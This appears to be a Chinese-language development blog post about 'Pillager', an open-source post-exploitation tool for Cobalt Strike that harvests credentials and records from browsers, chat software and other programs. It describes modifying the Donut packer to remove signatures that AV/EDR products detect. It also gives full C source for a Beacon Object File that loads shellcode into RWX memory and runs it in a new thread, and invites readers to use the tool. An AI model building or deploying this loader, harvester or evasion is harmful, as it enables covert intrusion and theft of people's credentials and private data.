---
title: Pillager开发记录-1
date: 2023-4-15 05:40:56
categories: 
- Forensics
tags:
- Forensics
---
今年上半年，在开发 CobaltStrike 插件期间，没用遇到合适且长期更新的信息收集工具，便决定自己制作一款，也就有了[Pillager](https://github.com/qwqdanchun/Pillager)项目。

这款工具旨在收集机器上浏览器，聊天软件，已经其他常用工具的凭证、记录等敏感信息，从而进行进一步的后渗透工作。

# 思路的确定

最初的想法只是为了制作一个小巧简介的 BOF ，但是后期研究发现使用 BOF 开发并不合适，综合考虑下选择了使用C#开发。进而就要考虑内存执行 C# 的问题，以及 C# 不可避免的 CLR 环境兼容问题。这时我就想到了 [Donut](https://github.com/TheWover/donut) 工具，使用其打包 shellcode 可以制作一个很简单的 BOF 去加载 shellcode 。

# CLR环境兼容问题

这里其实解决起来很简单，用到了之前写 C# 马时就曾经使用过的一个小技巧，也就是 .Net Framework v3.5 生成的文件，修改其 MetaData Header 中的 VersionString 为 `v4.0.30319`即可在 v4.x 的环境下正常使用。

经过测试，系统会根据这个字符串指定 CLR 版本，在手动加载 CLR 环境并加载 Assembly 时，只要自己指定正确版本即可，无需修改字符串。

当然，这样做对开发时使用的库有一定的要求，需要尽量避免使用第三方库，但是这种问题就很好解决了。

# Donut相关

Donut 本身就是一个很完善的项目，但是对于此处使用，仍然有一些可以改进的地方，首先是在 Donut 内完成了上文的 CLR 兼容，其次是删除了与 .Net 加载无关的代码，并处理了两处 Donut 被 AV/EDR 标记的静态特征，最大程度的保证了可用性和体积的最小化

# BOF加载器

为了方便 CobaltStrike 使用，我制作了一个非常简单的 BOF 去加载生成的 shellcode ，后期有需要，也可以对此进行更改以避免分配 RWX 内存的行为

```c
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LPVOID   WINAPI   KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL     WINAPI   KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess (VOID);

VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    datap   parser;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    LPVOID pMem;
    SIZE_T bytesWritten = 0;
    DWORD dwThreadId = 0;

    BeaconDataParse(&parser, Buffer, Length);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
    pMem = KERNEL32$VirtualAlloc(0, dwShellcodeBufferSize,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    KERNEL32$WriteProcessMemory(KERNEL32$GetCurrentProcess(), pMem, lpShellcodeBuffer, dwShellcodeBufferSize, &bytesWritten);
    KERNEL32$CreateThread(0, 0, pMem, 0, 0, &dwThreadId);
}
```

# 结论

至此，基本的准备工作已经就绪，后续我会陆续的更新文章，介绍各个收集目标的具体原理及使用方法

此工具开源于 [https://github.com/qwqdanchun/Pillager](https://github.com/qwqdanchun/Pillager) ，欢迎大家关注和使用
